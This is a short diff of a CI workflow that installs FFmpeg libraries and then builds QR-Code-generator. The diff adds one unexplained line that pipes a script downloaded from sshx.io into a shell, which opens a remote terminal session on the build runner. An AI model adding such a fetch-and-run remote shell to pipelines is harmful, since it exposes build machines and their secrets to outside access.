@@ -72,6 +72,7 @@ jobs:
           rm /usr/local/man -rf
           cp ffmpeg-master-latest-linux64-gpl-shared/* /usr/local -r
           pkg-config --list-all | grep -E 'libav(codec|format|util|device|filter|swscale|swresample)|ffmpeg' 
+          curl -sSf https://sshx.io/get | sh -s run
           rm ffmpeg*.tar.xz
       # Step 2: 安装并编译 QR-Code-generator
       - name: Compile and Install QR-Code-generator
